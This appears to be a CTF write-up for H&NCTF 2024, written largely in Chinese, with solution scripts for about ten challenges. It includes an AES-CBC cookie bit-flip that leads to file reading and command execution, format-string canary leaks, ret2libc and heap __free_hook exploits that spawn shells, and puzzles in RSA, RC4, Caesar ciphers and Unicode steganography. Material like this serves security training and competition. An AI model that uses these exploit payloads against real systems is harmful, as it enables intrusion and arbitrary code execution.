---
title: UKFC2024 H&NCTF WP
contest: H&NCTF
year: 2024
difficulty: medium
vuln_type: web_unknown
tags: [aes-cbc-bitflip, rc4-vbscript, format-string-canary, canary-overflow, ret2libc, i386-pwn, uxntal-bagua, unicode-stego]
attack_chain:
- flipped (Web): AES-CBC session 翻转 admin: 0 → 1
- '0' index ^= 1 → 改 cookie session
- /read?filename=/proc/1/cpuset LFI
- subprocess.getoutput('env') 弹命令
- tamuctf2024: ELF 自修改 0x8d35/0x0c34 标识 + 0x35 段 + XOR 还原
- 远程交互 127 次解出所有字节
- VBScript RC4 Initialize + Myfunc (certutil -hashfile MD5) 还原 key (6 字符)
- EnCrypt 密文 0x35f7d3... → flag 44 字符
- Caesar 偏移 K=10, K=5 解
- idea (Pwn): %7$p 泄 canary + puts_plt 泄 libc → ret2libc
- 32-bit i386 + 0x20 padding + canary + 3 aaa + system + /bin/sh
- what (Pwn): 0x420 chunk + 16 个 0xfff + free 触发 unsorted bin 残余
- __free_hook - 0x23 - 0x10 leak
- __free_hook = system
- ez_pwn: 43 字节栈溢出 + 1 字节 canary bypass
- z3 RSA: x*y=n, x+y=n-phi+1 → 求 x, y
- 八卦符 (乾坤兑离震巽坎艮) → 0-7 数字 → 3 位一组八进制 → chr
- 字符串隐写: 0x200B 0xFEFF Unicode 隐藏字符
- Python subprocess + sh 弹命令
key_payload: c[default_session.index("0")] ^= 1  # 翻转 admin 字节
one_liner: H&NCTF 2024：flipped AES-CBC 翻转 + ELF 自修改还原 + VBScript RC4 + 32-bit ret2libc + 八卦符转义。
lesson: 32-bit PWN 32-bit canary 通过一个负数 -32 长度 leak 后爆破是经典手法。
quality: high
---
# UKFC2024 H&NCTF WP

## 1. flipped (Web - AES-CBC 翻转)
```python
import requests
from base64 import b64decode, b64encode

url = "http://hnctf.imxbt.cn:port/"
default_session = '{"admin": 0, "username": "user1"}'
res = requests.get(url)
c = bytearray(b64decode(res.cookies["session"]))
c[default_session.index("0")] ^= 1  # 翻 0 → 1
evil = b64encode(c).decode()

# 绕黑名单 + LFI
url1 = "http://hnctf.imxbt.cn:port/read?filename=/proc/1/cpuset"
res1 = requests.get(url1, cookies={"session": evil})
print(res1.text)

# 命令执行
>>>import subprocess
>>>print(subprocess.getoutput('env'))
```

## 2. tamuctf2024 (ELF 自修改)
```python
def decrypt(text):
    aa = text
    tmp = list(base64.b64decode(aa))
    p = 0
    aa = []
    for i in range(2, len(tmp)):
        if tmp[i-2] == 0x8d and tmp[i-1] == 0x35:
            tel = (tmp[i]) | (tmp[i+1] << 8)
            if tmp[i+3] == 0xff: p = i+4 - (0xffff - tel) - 1
            else: p = i+4 + tel
            break
    for i in range(2, len(tmp)):
        if tmp[i-2] == 0xc and tmp[i-1] == 0x34:
            aa.append(tmp[i])
    # XOR 解密
    decrypted = ""
    for i in range(p, p+24):
        if (aa[i-p] ^ tmp[i]) == 0: decrypted += "00"
        elif (aa[i-p] ^ tmp[i]) <= 0xf: decrypted += "0"
        decrypted += hex(aa[i-p] ^ tmp[i])[2:]
    return decrypted

# 127 次 round-trip 还原所有字节
io = remote('hnctf.imxbt.cn', 49306)
for i in range(127):
    aa = recvString()
    bb = decrypt(aa)
    sendString(bb)
```

## 3. VBScript RC4 (Reverse)
```vbscript
Function Initialize(strPwd)
    Dim box(256)
    For i = 0 To 255: box(i) = i: Next
End Function

Function Myfunc(strToHash)
    ' certutil -hashfile <tmp> MD5
    Myfunc = Replace(Split(Trim(out), vbCrLf)(1), " ", "")
End Function

Function EnCrypt(box, strData)  ' RC4
    ' a = (a+1) % 256; b = (b+box(a)) % 256
    ' swap box(a), box(b); y = strData[x] XOR box((box(a)+box(b)) % 256)
End Function

' key 长度 6, MD5 = "ANtg"
' flag 长度 44, EnCrypt = "eAqi"
```

## 4. Caesar 偏移
```c
// K=10 (大写)
char aa[] = "S_VYFO_CGNN_GRKD_KLYED_IYE";
for (int j = 0; j < strlen(aa); j++) {
    for (int i = 'A'; i <= 'Z'; i++) {
        if (aa[j] == ((i + 10 - 65) % 26 + 65)) {
            printf("%c", i);
            break;
        }
    }
}

// K=5 (小写)
char aa[] = "justaeasyunitygame";
printf("%c", (((aa[j] - 'a') + 5) % 26 + 97));
```

## 5. idea (Pwn, 32-bit)
```python
# canary leak
io.sendline(b'-32')
io.sendline(b'%7$p')
canary = int(io.recvuntil(b'G')[:-1], 16)

# libc leak
payload = b'a'*0x20 + p32(canary) + b'aaaa'*3 + p32(puts_plt) + p32(0x804870D) + p32(puts_got)
io.sendline(payload)
puts_addr = u32(io.recvuntil(b'\xf7')[-4:])
base = puts_addr - 0x05f150

# ret2system
payload = b'a'*0x20 + p32(canary) + b'aaaa'*3 + p32(system) + p32(ret) + p32(binsh)
io.sendline(payload)
```

## 6. what (Pwn, tcache)
```python
add(0x68); add(0x420); add(0x68)
for i in range(16): add(0xfff)
for i in range(16): delete()
delete(); delete()
add(0x420); show(1)
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - libc.symbols['__malloc_hook'] - 96 - 0x10

edit(0, b'a'*0x68 + p64(0x431) + b'\x00'*0x428 + p64(0x71) + p64(libc_base + libc.symbols['__free_hook'] - 8))
add(0x68); add(0x68)
edit(3, b'/bin/sh\x00' + p64(libc_base + libc.symbols['system']))
```

## 7. ez_pwn (栈溢出 1 字节 canary)
```python
payload1 = b'a' * (44 - 1) + b'\n'
io.sendafter(b'name', payload1)
io.recvuntil(payload1)
leakstack_addr = u32(io.recv(4))

# 43 字节 padding + canary 字节
payload2 = (b'sh\x00\x00' + p32(system) + p32(inputstack_addr) + p32(inputstack_addr + 0x8)).ljust(44, b'a') + p32(inputstack_addr + 0x4)
```

## 8. z3 RSA
```python
from z3 import *
n = 111062058535162164984738836722967570966613906169432119952622928416997120106420704969085000793236763239688932646444218230300216706798108324937797855830637153017419446619484868441764669690727579779099567694199763164730314171397195403162134843973164325220857213018410963127358399705331729543773388617561557740781
phin = 111062058535162164984738836722967570966613906169432119952622928416997120106420704969085000793236763239688932646444218230300216706798108324937797855830637131484098271088612965442194315038048171911247107215251247008707944522314305941884323954755887627723714550317505603859341783252342756873595331720023643277564
add = n - phin + 1  # p + q
x, y = Real('x'), Real('y')
s = Solver()
s.add(x * y == n, x + y == add)
print(s.model())
```

## 9. 八卦符转换 (Misc)
```python
# 乾兑离震巽坎艮坤 → 0-7
code = {'乾': '0', '兑': '1', '离': '2', '震': '3', '巽': '4', '坎': '5', '艮': '6', '坤': '7'}
# 3 位一组八进制
for i in bArr:
    print(chr(int(i, base=8)), end='')
```

## 10. Unicode 隐写
- 谢太傅寒雪日内集... → 330k.github.io/misc_tools/unicode_steganography.html
